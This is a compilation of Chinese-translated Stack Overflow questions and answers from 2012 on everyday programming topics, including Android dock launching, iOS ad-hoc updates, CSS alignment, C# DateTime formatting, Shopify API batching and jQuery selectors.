# java - Java 媒体框架 MP3 插件

> ID：11935545
> 
> 赞同：4
> 
> 时间：2012-08-13T13:43:50.897
> 
> 标签：java, encoding, mp3, jmf, decoding

我正在寻找一个可以编码/解码 mp3 文件的库。我想写一个可以改变mp3文件比特率的程序。

有谁知道 Oracle 的 JMF MP3 插件是否可以完成这项工作。这是它的链接： [JMF MP3 插件](http://www.oracle.com/technetwork/java/javase/download-137625.html)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T00:28:59.923

JMF的[mp3plugin.jar](https://drive.google.com/file/d/0B5B9wDXIGw9lRmpSbEUtenljd1k/view?usp=sharing&resourcekey=0-miuzcGB8fsXn2EQh3sVolA)是一个用于**解码**MP3 的 SPI。它不提供用于编码的 SPI。

# ios - iOS 即席分发更新

> ID：11935549
> 
> 赞同：1
> 
> 时间：2012-08-13T13:44:03.487
> 
> 标签：ios, release, adhoc

我计划使用此处概述的步骤使用 Ad-Hoc Distribution 分发应用程序：

[http://aaronparecki.com/How_to_Distribute_your_iOS_Apps_Over_the_Air](http://aaronparecki.com/How_to_Distribute_your_iOS_Apps_Over_the_Air)

但我想知道 Ad-Hoc 分发如何处理更新。应用程序会自动检查我们的服务器是否有更新，还是每次我们都必须将用户重定向到我们的服务器 url 以手动下载？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:46:45.960

Ad-Hoc 分发没有内置的更新过程/服务。您需要自己推动构建并为用户提供建议。你看过[TestFlight](http://www.testflightapp.com)吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:56:26.207

也许您的应用程序可以通过推送通知通知用户。只需发送包含更新 IPA 链接的通知消息。

用户看到通知，打开您的应用程序，转到您提供的链接，下载新版本。更新完成。

但是，当然，您需要处理一些副作用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-11-29T12:55:51.727

Ad-Hoc 分发本质上不处理检查和更新应用程序的过程。

可以创建一项必须执行以下操作的服务：

1.  提供一个 api 来检查更新
2.  托管更新的plist文件
3.  托管更新的ipa

在适当位置的应用程序中调用 api 以检查更新，如果有更新，请打开 plist 的 url，如下所示

```
[[UIApplication sharedApplication] openURL:[NSURL URLWithString:"itms-services://?action=download-manifest&url=<link to the update plist>]]; 
```

像这样安装应用程序时，系统 UI 似乎是新安装的应用程序，但实际上它的行为与更新完全一样，所有旧数据都由系统保留

我遇到了[https://apptele.com](https://apptele.com)他们提供这种服务来托管您的更新和示例代码以检查更新并处理用户界面。

# android - 如果使用选中复选框，则应用程序会在设备放入汽车文档时自动启动

> ID：11935557
> 
> 赞同：0
> 
> 时间：2012-08-13T13:44:27.637
> 
> 标签：android

我希望我的应用程序在设备放入汽车文档时自动启动。我发现这个对清单有用的代码，但如果他想使用这个选项，我想给用户一个带有复选框的选项。

```
 <action android:name="android.intent.action.MAIN" /> 
<category android:name="android.intent.category.LAUNCHER" /> 
<category android:name="android.intent.category.CAR_DOCK" />
 <category android:name="android.intent.category.DEFAULT" /> 
```

如果用户选中选项，如何使这成为可能，然后应用程序将在放置在汽车底座时启动，否则不会。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:47:21.030

将上述清单条目用于广播接收器而不是活动。在广播接收器中，您可以检查首选项，然后启动活动。

编辑：使用上述清单更改注册 DockReciever。如果这不起作用，请使用以下操作

```
<action android:name="android.intent.action.ACTION_DOCK_EVENT"/> 
```

如果您使用它，您将不得不检查扩展坞的状态。

```
public class DockReciever extends BroadcastReceiver {

    @Override
    public void onReceive(Context arg0, Intent arg1) {
        SharedPreferences settings = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        boolean launch = settings.getBoolean(Utility.KEY_LAUNCH, false);
        if(settings.getBoolean(Utility.KEY_LAUNCH, false)){
         Intent intent = //your Activity intent goes here
         arg0.startActivity(intent);
         }

     }

} 
```

# iphone - 如何从iphone中的url获取图片

> ID：11935562
> 
> 赞同：0
> 
> 时间：2012-08-13T13:44:39.267
> 
> 标签：iphone, imageview

我是 iPhone 的新手。我想从 url 获取图像

我尝试了休闲代码

```
-(void)viewDidLoad
{
 UIImageView *UV=[[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 320, 480)];
 [self.view addSubview:UV];    
 NSURL *url = [NSURL URLWithString:@"http://www.google.com/recaptcha/api/noscript?k=6LdON9USAAAAAO9AtfFsuLxBY1l-yNDBoJcb1Jeb"];

    NSData *myData = [NSData dataWithContentsOfURL:url];
    UIImage *image = [[UIImage alloc] initWithData:myData];
    UV.image=image;
} 
```

但图像未显示在图像视图中。任何人都可以帮助我提前谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:13:55.380

您提供的 URL 不是图片，因此无法使用。

更重要的是，虽然看起来还可以，但绝对不建议这样做。

在下载过程中调用`dataWithContentsOfURL:`阻塞了主线程，使应用程序无响应。

看看 Antaresm 提到的一些开源项目。
您可能还想查看[AFNetworking](https://github.com/AFNetworking/AFNetworking/)，将其放入您的项目中，然后，您所要做的就是

```
[UV setImageWithURL:url]; 
```

# html - 图像旁边链接的 CSS 对齐方式

> ID：11935565
> 
> 赞同：0
> 
> 时间：2012-08-13T13:45:11.297
> 
> 标签：html, css, html5boilerplate

这是我的[jsfiddle](http://jsfiddle.net/imakeitpretty/Fn4vP/4/)。

“关注我们”链接位于推特图标旁边。我想要的是`css`如果可能的话，使用不使用内联样式的链接垂直居中在图像上。

我尝试直接向`<a>`标签添加一个类，然后调整边距。那没有用。

我尝试直接向`img`标签添加一个类，然后调整边距。那没有用。

我再次尝试做这两件事来调整填充而不是边距。

这甚至可能是我设置它的方式还是我必须改变`html`..或两者兼而有之？

任何建议都非常感谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T13:49:12.000

您可以`vertical-align:middle`同时设置`<a>`和`<img>`您希望对齐。

**编辑：**见[http://jsfiddle.net/Fn4vP/16/](http://jsfiddle.net/Fn4vP/16/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T13:49:40.140

我将`float`图像向左，然后`line-height`将`a`标签的 更改为等于图像的高度（在本例中为 19px）。要将行高仅定位到“跟随我们”周围的锚点，只需向锚点添加一个类，例如`.follow`.

**HTML**

```
<img src="imageURL.png" width="24px" height="19px">
<a href="#" class="follow"> Follow Us</a> 
```

**CSS**

```
img { float: left; }
.follow { line-height: 19px; } 
```

[JS 小提琴示例](http://jsfiddle.net/Fn4vP/17/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T14:03:52.783

我会使用`line-height`，基本上，将您的图像向左浮动，将链接向左浮动，然后清除下一个`<h3>`标签上的浮动。将此部分更改为以下内容：

```
<!-- Dont forget to close your image tag.  -->
<img src="http://i46.tinypic.com/2ly6hc4.png" width="24px" height="19px"/>
<a href="#" class="flw-link"> Follow Us</a>
<!-- Added class .flw-link to Follow us link --> 
```

现在在你的 CSS 中：

```
/* Float the image and link to the left */
.twitter-feed img{float: left;}
/* Set the line-height of the text to center vertically to the image */
.twitter-feed .flw-link{float: left; line-height: 21px;}
/* Finally, clear your floats on the next tweet header */
.twitter-feed h3{clear: both;} 
```

看看这个 jsfiddle：http: [//jsfiddle.net/Fn4vP/25/](http://jsfiddle.net/Fn4vP/25/)

我会这样做并浮动两个元素，因为我必须选择更改`0`将文本放置在顶部的行高。然后，您可以使用 line-height 对文本垂直放置的确切位置进行像素控制。

# database - 想使用视图但不能有外键

> ID：11935570
> 
> 赞同：0
> 
> 时间：2012-08-13T13:45:32.123
> 
> 标签：database, database-design

假设我有以下实体：客户、帐户、协议、子协议、子协议帐户。

客户拥有零个或多个帐户，客户拥有零个或多个协议。每个协议都有客户可以访问的特定类型的所有帐户。客户可以访问比他自己的帐户更多的帐户，因此我有一个视图可以检索客户有权访问的所有帐户（具有帐户类型）。

由于协议具有某种类型的帐户，因此我想要一个新视图来帮助我轻松查询，这将为我提供某个协议的所有帐户（基本上使用第一个视图，但将其与协议的帐户类型结合起来）。

然后，客户可以使用该协议作为基础创建子协议。因此，客户可以选择使用基本协议（子协议帐户）上的某些帐户子集创建子协议。在这里，我想要基本协议帐户的外键，以防止将帐户插入不在基本协议中的子协议中。但由于这只是一个视图，这是不可能的！

我是否应该跳过外键并使用应用程序逻辑（也可能是 Account 和 sub-agreement-account 之间的外键）来确保无法在不基于 base 的子协议中插入帐户协议？或者我应该引入一个表“协议帐户”，具体化帮助我获得协议帐户并让我的应用程序维护该表的视图？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:05:55.430

我永远不会创建任何额外的表来强制（偶尔）关系约束。
务必在帐户和协议之间创建自然关系/约束，但不要为了偶尔使用而引入任何额外的数据复杂性。
在创建子协议时向用户展示对基本协议有效的帐户子集，并在保存时仔细检查所选列表。

# html - 在 DIV 内部定义 DIV 类的更优雅的方式

> ID：11935571
> 
> 赞同：-1
> 
> 时间：2012-08-13T13:45:33.720
> 
> 标签：html, css

让我们看看这个：

```
<div class="login_container">
  <div>Log in:</div>
  <div>Username:</div>
  <div>Jelszó:</div>
</div> 
```

我希望“登录”文本有另一个类。通常，我会这样做：

```
<div class="login_container">
  <div class="textCenter login_container_title">Log in:</div>
  <div>Username:</div>
  <div>Jelszó:</div>
</div> 
```

但这会使它有点复杂。我听说 :first 或 CSS 中的其他魔法 ( < ) 东西，有没有办法让它更优雅？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:51:50.690

您可以使用 jQuery 将类添加到 login_container div 的第一个元素。

```
jQuery("div#login_container div:first").addClass("myClass"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T13:54:25.930

你可以简单地使用

```
.login_container > div:first-child {} 
```

这将比 jQuery 更有效

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-13T13:57:50.033

你可以在 CSS 中使用`:first-child`伪元素来做到这一点：

```
.login_container > div:first-child {color:#f00} 
```

（要`:first-child`在 IE8 及更早版本中工作，`<!DOCTYPE>`必须声明 a。）

或者像 Lohn Smith 用 jQuery 做的那样：

```
$('.login_container div:first').addClass('highlight');​ 
```

[jsFiddle](http://jsfiddle.net/w2eqK/)的一个简单示例

# c# - VS 2010 在打开或运行项目时更改锚属性

> ID：11935574
> 
> 赞同：0
> 
> 时间：2012-08-13T13:45:43.633
> 
> 标签：c#, winforms, visual-studio-2010

在打开我的项目时，我有点困惑地看到我的表单选项卡上出现了“已更改”的星号。然后我运行该项目并找到了我已将其锚属性设置为底部 | 的按钮。右已更改为底部 | 左边。我在 IDE 和 .designer 文件中将其改回，但 ide 不断将其改回。

还有其他人遇到过这个吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:53:31.873

好的，我想这里的教训是永远不要在关闭项目时同时打开 .designer 文件和表单视图。显然它有时会“混淆”IDE。

我关闭了两个文件，然后关闭并重新打开了项目，一切似乎都很正常。

# ruby-on-rails - Rails 中的嵌套聚合函数

> ID：11935576
> 
> 赞同：0
> 
> 时间：2012-08-13T13:45:47.383
> 
> 标签：ruby-on-rails, postgresql, nested, aggregate-functions

如何在 Rails 中执行此操作？：

```
select avg(cnt)
from
(
    select
        count(*) as cnt
    from
        sngs s
        inner join clbs c on c.id = s.clb_id
    where
        c.user_id = 35
    group by
        date(s.record_date)
) sc 
```

线

current_user.sngs.joins(:clb).average("count(*)", group: "date(record_date)")

给出一个错误：

**PG::Error: 错误：聚合函数调用不能嵌套第 1 行：SELECT AVG(count(*)) ......**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:11:43.190

我**没有测试**它，但它可能看起来像这样：

```
Sng.joins(:clbs).where("clbs.user_id = 35").group(:record_date).average 
```

您应该查看`ActiveRecord`Rails Guides 上的查询界面。[http://guides.rubyonrails.org/active_record_querying.html](http://guides.rubyonrails.org/active_record_querying.html)
这个链接解释了许多你应该使用的查询方法。

**编辑**

一起看看`count`, `average`, `having`,`group`和 chaning 所有这些。

# php - 当用户点击浏览器后退按钮（并且页面未刷新）时设置新的会话变量？

> ID：11935579
> 
> 赞同：0
> 
> 时间：2012-08-13T13:45:49.087
> 
> 标签：php

我正在使用 php 会话管理我的类别变量。

如果用户这样点击：

1.  指数
2.  类别（类别设置会话变量）
3.  产品（产品获取该变量）

之后，如果用户没有按**主页链接**（刷新索引页面），而是按**浏览器的后退按钮**，则会发生这种情况：

1.  用户刚刚到达具有较早设置的类别变量的索引页面；
2.  如果他直接从索引中单击产品，则会显示旧类别。

基本上，当用户点击浏览器的后退按钮（并且页面没有刷新）时，有没有办法设置新的会话变量？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:06:53.593

这正是您应该保持请求*自包含*的原因。构建导航所需的所有信息都应该以某种方式出现在请求本身中，即 URL 中。您可以从用户正在查看的产品或请求中已包含的一些其他信息中推断出类别，或者您应该在查询参数 ( `...?cat=42`) 中传输选定的类别。这样，每个请求都在其内部表达了所有必要的信息，并且不会破坏保存在其他地方的任何单独的状态。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:04:07.370

如果单击产品，则应根据该产品列出的类别设置当前类别。忽略旧的存储类别并使用产品的替代品。

就底层 http 请求而言，单击后退按钮的用户没有什么特别或独特的。浏览器要么使用其缓存，甚至不向 Web 服务器发出另一个请求，要么像单击链接一样发出请求以再次获取上一页。

你可以用 javascript 做一些花哨的东西来检测它，但我非常怀疑这将是一个优雅或最佳的解决方案。

# javascript - 错误：错误：语法错误，无法识别的表达式：

> ID：11935580
> 
> 赞同：3
> 
> 时间：2012-08-13T13:45:50.717
> 
> 标签：javascript, jquery

我不断收到以下错误

错误：错误：语法错误，无法识别的表达式：表 $MainContent$gridPlans$ctl02$chkSelected 源文件：[http](http://code.jquery.com/jquery-latest.min.js) ://code.jquery.com/jquery-latest.min.js 行：2

我已经研究了脚本的哪一部分导致了这个问题，但不确定如何解决它：

```
// Check Box selector
    $("input:checkbox:not(:checked)").each(function () {
        var column = "table ." + $(this).attr("name"); // this line is not working
        $(column).hide();
    });

    $("input:checkbox").click(function () {
        var column = "table ." + $(this).attr("name");
        $(column).toggle();
    });

// Manage column checkboxes that should be unchecked
function manChecks() {
    var __CS = document.getElementById('__CS');
    var cols = __CS.value; // this line also causing issues

    colManage(1, cols.indexOf('|1') != -1);
    colManage(2, cols.indexOf('|2') != -1);
    colManage(3, cols.indexOf('|3') != -1);
    colManage(5, cols.indexOf('|5') != -1);
    colManage(6, cols.indexOf('|6') != -1);
    colManage(7, cols.indexOf('|7') != -1);
    colManage(8, cols.indexOf('|8') != -1);
    colManage(9, cols.indexOf('|9') != -1);
}

function colManage(id, show) {
    document.getElementById(id).checked = show;
    var column = "table ." + id;
    if (show) {
        $(column).show();
        $('label[for=' + id + ']').addClass('checked')
    }
    else {
        $(column).hide();
        $('label[for=' + id + ']').removeClass('checked')
    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T13:50:01.047

您的类选择器中有`$`字符 - 这些需要转义。

[需要转义 jQuery 选择器字符串中的特殊字符](https://stackoverflow.com/questions/2786538/need-to-escape-a-special-character-in-a-jquery-selector-string)

[jQuery选择器值转义](https://stackoverflow.com/questions/739695/jquery-selector-value-escaping)

[http://samuelsjoberg.com/archive/2009/09/escape-jquery-selectors](http://samuelsjoberg.com/archive/2009/09/escape-jquery-selectors)

# css - 相邻兄弟选择器不适用于 IE7/8 中动态添加的类

> ID：11935581
> 
> 赞同：3
> 
> 时间：2012-08-13T13:45:52.113
> 
> 标签：css

```
<span id='span1'>span1</span>
<span>span2</span>
<button id='btn'>select span1</button>

#span1.selected + span {
    background-color:red;
}

$('#btn').click(function() {
    $('#span1').addClass('selected');
}); 
```

[http://jsfiddle.net/xSGh5/](http://jsfiddle.net/xSGh5/)

我正在使用相邻的兄弟选择器为自定义图像设置样式复选框，所以我不想放弃这个选择器。任何解决方法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T14:19:30.057

好吧，这是一个已知的错误，请参阅此处有关`+`选择器的部分：[http ://www.quirksmode.org/css/contents.html](http://www.quirksmode.org/css/contents.html)

# android - 异步获取时如何避免列表视图中的多个位图实例化？

> ID：11935582
> 
> 赞同：1
> 
> 时间：2012-08-13T13:45:55.697
> 
> 标签：android, listview

**问题**

我对位图和列表视图在每个位置多次调用 getView() 的行为有疑问。

我的列表仅包含位图并从远程位置异步获取它们。现在，当显示列表视图时，由于 getView() 为每个位置调用大约 4 次（不滚动），它将为同一位置实例化 4 个不同的位图实例（并且只使用一个......），这会导致的内存错误。

**我试过的**

我已经有一个位图缓存，但这发生在第一次获取图像之前。例如，打开 listView，对位置 0 的位图发出 4 次请求，一旦到达，将位图保存在缓存中。在此之后，问题就解决了。但我的问题是第一次创建 4 个位图（对于项目 0、项目 1、项目 2、项目 3 -> 16 个位图，我只需要 4 个）。

我已经尝试了一些策略来解决这个问题，比如实现一个“等待”的 imageViews 列表，只获取一个，然后为所有等待的图像设置位图，但这产生了新的问题，而且同步也很困难。

我还尝试添加一个列表字段，其中包含已获取的列表视图位置，以便仅获取和设置一次，getView() 似乎每次都会生成不同的图像视图（或类似视图）（我正在回收 convertView，但是无论如何），因为我以空位置结束（尽管在其中一个图像视图中获取、实例化和设置的所有位图）。为了解决这个问题，我使用了一个将位置映射到 ImageView 列表的地图字段，并将位图设置为所有需要一个位置的 imageView。应该工作，但它也没有。在大多数位置，我得到了正确的位图，但是，例如，在列表的第一个位置，我从最后一个可见位置获得位图（我可以看到它快速切换，首先它从位置 0 显示位图，然后是 1，然后是 2，然后是 3——我最后一个可见的位置——）。

我想到的另一种可能性，但感觉像是一个糟糕的解决方案（就像其他解决方案一样），是预取位图，因此，在列表滚动之前，我已经在缓存中有下 x 个位图。这将与滚动侦听器结合实现，滚动导致获取下一个 x 项并将它们放入缓存中。因此，当列表调用 getView() 时（无论多么讨厌），它总是会从缓存中获取相同的预取位图实例）。

我不应该是唯一一个有这个问题的人，因为从网络上获取位图的列表/网格视图很常见......

有什么解决办法吗？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T22:38:35.303

我注意到这种行为只发生在第一个可见项目上。当我向下滚动列表直到最后时，它仍然会一直调用`getView()`第一个项目，但对于其余的，它只调用一次。

对于第一个列表项，预加载位图可能是有意义的，因此当列表调用时它们已经在内存中`getView()`，并且不会被实例化。现在，我改进了应用程序其他部分的内存使用情况，这样这个问题就不会导致设备崩溃。

# c# - 日期时间.ToString()？

> ID：11935584
> 
> 赞同：3
> 
> 时间：2012-08-13T13:46:00.317
> 
> 标签：c#, string, date

我有问题。如何正确显示我的日期文本？

使用`DateTime.Now`我能够接收计算机时钟当前设置的日期和时间，但是，当我尝试解析为字符串格式时，它还显示日期如下：12-04-2012 12:38**但**我试图仅获取时间字符串，例如仅**12:38**？

到目前为止我尝试的是`Console.WriteLine(DateTime.Now.ToString("00:00:00"));`

但它没有工作=/

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-13T13:47:44.730

`DateTime`定义了一个[`ToShortTimeString`](http://msdn.microsoft.com/en-us/library/system.datetime.toshorttimestring.aspx)方法：

```
DateTime.Now.ToShortTimeString() 
```

或者，您可以使用[自定义格式字符串](http://msdn.microsoft.com/en-us/library/8kb3ddd4.aspx)：

```
DateTime.Now.ToString("HH:mm") 
```

或者，将[标准格式字符串](http://msdn.microsoft.com/en-us/library/az4se3k1.aspx)用于[短时间格式](http://msdn.microsoft.com/en-us/library/az4se3k1.aspx#ShortTime)：

```
DateTime.Now.ToString("t") 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-13T13:47:43.137

一种适用于很多问题的解决方案是阅读文档：http: [//msdn.microsoft.com/en-us/library/zdtaw1bw%28v=vs.80%29.aspx](http://msdn.microsoft.com/en-us/library/zdtaw1bw%28v=vs.80%29.aspx)

使用格式“t”似乎可以做你想做的事

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-23T08:29:17.967

对于使用`DateTime.Now.ToString()`，此链接非常有用并解释了所有模式：[http ://www.geekzilla.co.uk/View00FF7904-B510-468C-A2C8-F859AA20581F.htm](http://www.geekzilla.co.uk/View00FF7904-B510-468C-A2C8-F859AA20581F.htm)

模式如下：

```
DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss") 
```

2006 年 8 月 22 日星期二 06:30:07

```
DateTime.Now.ToString("ddd, dd MMM yyyy HH':'mm':'ss 'GMT'") 
```

格林威治标准时间 2006 年 8 月 22 日星期二 06:30:07

```
DateTime.Now.ToString("MM/dd/yyyy") 
```

2006 年 8 月 22 日

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-13T13:47:11.520

只需使用这个：

```
DateTime.Now.ToString("hh:mm"); 
```

或者

```
DateTime.Now.ToShortTimeString(); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-13T13:49:30.440

尝试像这样格式化：

```
Console.WriteLine(DateTime.Now.ToString("hh:mm:ss")); 
```

或者

```
Console.WriteLine(DateTime.Now.ToString("hh:mm")); 
```

但我最喜欢的是

```
Console.WriteLine(DateTime.Now.ToShortTimeString()); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-13T13:53:41.860

你可以试试：

var dt = DateTime.Now.TimeOfDay; dt.ToString().Substring(0, 5);

# java - 在两个单词之间搜索包含关键字的文本文件行

> ID：11935586
> 
> 赞同：0
> 
> 时间：2012-08-13T13:46:03.640
> 
> 标签：java, text-files, keyword

我必须从包含关键字的文本文件中提取行，由两个单词分隔。

我已经找到了只包含关键字 (with `contains(string)`) 的行，但是我还需要在这之前和之后有一对行，可能不计算行数，而是搜索这组行的第一个和最后一个单词。

我怎么能这样做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:56:10.823

您可以在第一步中将这些行存储在 java.util.List 中，然后使用索引遍历列表。

```
List<String> lines = new ArrayList<String>();
while(reader.ready()){
  lines.add(reader.readLine());
}

for(int i = 0; i<lines.size();i++){
  if(lines.get(i).contains(string)){
    String lineMinusTwo = lines.get(i-2);
    String lineMinusOne = lines.get(i-1);
    String line = lines.get(i);
    String linePlusOne = lines.get(i+1);
    String linePlusTwo = lines.get(i+2);
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:56:47.007

如何实现一个“非常粗糙”的词法分析器来读取这些行并将它们映射到一个 HashMap 中。整数是行号，字符串是整行。处理整个文件，然后在找到具有关键字的行时循环遍历映射，您可以根据当前行号和下 n 行查找所需的前 n 行。

# api - 有没有一种方法可以通过一个 Shopify API 调用来创建多个产品？

> ID：11935589
> 
> 赞同：4
> 
> 时间：2012-08-13T13:46:12.253
> 
> 标签：api, shopify

Shopify API 允许客户一次下载包含 250 个项目的列表（产品、集合等）。有没有办法通过一个 API 调用也可以上传包含多个项目的新列表？从 api.shopify.com 的文档看来，每次调用只能创建一个项目。如果属实，例如，对于试图将店面与现有库存管理系统连接的用户来说，这将适得其反并且效率极低。

假设我们有一家商店，有 20,000 种产品和 200 个定制系列，为了论证，一个产品只属于一个系列。下载产品信息需要调用 products.xml 80 次，调用 custom_collections.xml 1 次，调用 collects.xml 80 次。我们只需要 161 次调用 API 来执行操作，而这个数字远低于 Shopify 规定的 5 分钟内 500 次调用的限制。

但是，要执行相反的任务（根据文档，一次创建或修改相同数量的产品）将需要对 products.xml 进行 20,000 次 API 调用、对 custom_collections.xml 进行 200 次调用和对 collects.xml 进行 20,000 次调用，每 5 分钟完成 500 个呼叫需要 7 小时。

有一个更好的方法吗？

**编辑** *我从下面的答案中了解到，确实，Shopify API 不允许一次创建/更新多个产品。在我看来，这是其他高效产品的一个重大缺陷，因此我将实现此功能的请求留在这里。现在我必须创建一个服务应用程序，它会不停地访问 API，尽可能快地更新产品。*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T16:08:58.007

**截至 2019 年 10 月，Shopify GraphQL API 确实有批量操作突变，允许完成大量工作。对于这个用例来说可能不是很好，但仍然是一个改进。**

您确实需要进行 20,000 次 API 调用才能使用 API 创建 20,000 个产品。API 调用被定量分配，每 300 秒 500 个。你在所有方面都是正确的。

一个简单的脚本将确保您遵守 API 限制，因此只需启动它，如果需要 7 小时才能完成，那又如何？您无需为每次 API 调用付费。您还可以完全避免 API 问题，只需使用 CSV 文件通过 Shopify 将所有 20,000 种产品直接上传到商店。那里没有刻录 API 调用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T16:12:13.723

不，无法通过 API 批量创建产品。

在使用库存管理系统时，我建议：

1.  等待初始 7 小时设置或要求商家[使用 CSV 上传批量创建第一个负载](http://wiki.shopify.com/Help%3aProducts#Bulk_Importing_Products_.28CSV.29)
2.  [注册 webhook](http://wiki.shopify.com/WebHook)，只告诉您已更改的产品库存，因此您只需更新集中库存系统中的这些条目
3.  使用`since_id`这篇[关于与商店同步的文章](http://wiki.shopify.com/Syncing_with_a_Store)

如果您仍然需要更多的喘息空间，请联系 apps@shopify.com 以获取更高的 API 限制，说明您需要它的原因以及您需要多少次调用。

爱德华，Shopify 开发者倡导者

# java - 如何读取 -Dserver.ref VM 参数

> ID：11935591
> 
> 赞同：1
> 
> 时间：2012-08-13T13:46:23.877
> 
> 标签：java, tomcat, junit, mockito

Tomcat 以 vm 参数启动：`-Dserver.ref=test`. 此参数的值确定应用程序要读取的属性文件类型。单元测试也依赖于这个属性的值，并且需要匹配 Tomcat 中设置的值。

我想我只需要在单元测试中自己设置这个属性？我认为没有一种机制可以检查`-Dserver.ref`Tomcat 中的值是什么？

![1](../Images/dd3e8932aecb371a02a06f0b1fa13ffc.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T17:48:13.060

您应该将读取系统属性的代码放在一个单独的类中，例如实现接口 SystemPropertyReader 的 RealSystemPropertyReader。该类的默认实现将使用 System.getProperty() 读取属性。您的类 MockSystemPropertyReader 的模拟版本将用于单元测试，并将返回您告诉它返回的任何内容。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T13:48:41.123

这应该有效：

```
final String ref = System.getProperty("server.ref"); 
```

`ref`应该等于`"test"`。

# iphone - 导航栏的自定义背景图像 - 调整大小和后退按钮颜色

> ID：11935593
> 
> 赞同：0
> 
> 时间：2012-08-13T13:46:27.707
> 
> 标签：iphone, objective-c, ios, uinavigationcontroller, customization

在我见到我的设计师之前，我需要知道 iPhone 导航栏的尺寸，我是否必须提供两张图片，一张高分辨率一张低？后退按钮如何工作，如何选择颜色？

问候

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:00:28.083

在非视网膜显示时，导航栏在纵向模式下为 320x44px。在横向它是 480x32。

`tintColor`后退按钮颜色基于`UINavigationBar`

如果您正在设置背景图像（使用`- (void)setBackgroundImage:(UIImage *)backgroundImage forBarMetrics:(UIBarMetrics)barMetrics`），您应该在标准和视网膜分辨率下为您支持的方向创建图像。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:49:09.693

您不一定需要提供高分辨率和低分辨率图像，这是可选的，但建议使用。高分辨率图像用于视网膜显示器，它可以在每平方英寸上包含比其前辈更多的像素。

想象一下 iPhone 上的导航就像有一摞卡片。您打开的每个新视图都会在堆栈顶部放置一张卡片。后退按钮只是将最上面的牌从堆叠中取出。

颜色可以专门指定，实际上按钮的外观可以完全改变（虽然不推荐这样做）

[您可以在此地图](http://www.idev101.com/code/User_Interface/sizes.html)中找到苹果推荐的 gui 元素尺寸。这里的大小以`pt`单位而不是像素表示，但是一些数学可以解决这个问题。

如果您需要了解预视网膜屏幕和视网膜屏幕的屏幕尺寸，您可以[在此处找到。](http://www.iphoneresolution.com/)

# cakephp - 如何在 CakePHP 中从不同的控制器渲染视图？

> ID：11935597
> 
> 赞同：0
> 
> 时间：2012-08-13T13:46:42.777
> 
> 标签：cakephp

我在尝试从两个单独的控制器调用视图上的渲染并将 html 自动检索到原始函数时遇到问题。我尝试了 $this->render，但这失败了，因为视图包含 GET 参数。当需要 GET 参数时，有什么方法可以从不同的控制器呈现视图？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-23T08:41:13.063

对于有相同问题的人，您可以在控制器中执行此操作：

```
$view = new View($this, false); // Create a new instance of the View class
$view->layout = 'ajax'; // Optional, use if you want a "clean" view
$view->set(compact('parameter1', 'parameter2')); // Send parameters to the view
$out = $view->render('url'); // Store the resultant HTML in the $out variable 
```

# javascript - 使用javascript将各种输入字段一起添加

> ID：11935598
> 
> 赞同：0
> 
> 时间：2012-08-13T13:46:44.453
> 
> 标签：javascript, html

我有几个文本字段

```
<input class="add" type="text">
<input class="add" type="text">
<input class="add" type="text">
<input class="add" type="text">
<p id="total"></p> 
```

每个字段中的值在页面加载时由 PHP 脚本动态添加，但用户可以选择编辑它们。我一直在尝试找出一种方法来使用 javascript 将所有值相加并将它们输出到#total p 标记中。我在周围找到了一些脚本并尝试自己编写一个，但它没有接缝工作。

我找到的最好的看起来像这样......

```
function addAll() {
  var sum = ""

  var values = $('.add').each(function(){
    sum += isNaN(this.value) || $.trim(this.value) === '' ? 0 : parseFloat(this.value);
  });

  $('#total').text(sum);
}
$('.add').keyup(displayTotal); 
```

但这没有输出任何东西

我做错了什么吗？

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:53:28.300

变量总和 = 0;

总和 += isNaN($(this).val()) || $.trim($(this).val()) === '' ？0 : parseFloat(this.val());

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:56:10.267

```
$('.add').keyup( function(){
  var sum = 0;

   $('.add').each(function(){
         sum +=  this.value && (this.value|0) && parseFloat( this.value ) || 0;
    });
   $('#total').text(sum);

}); 
```

* * *

## 回答 #3

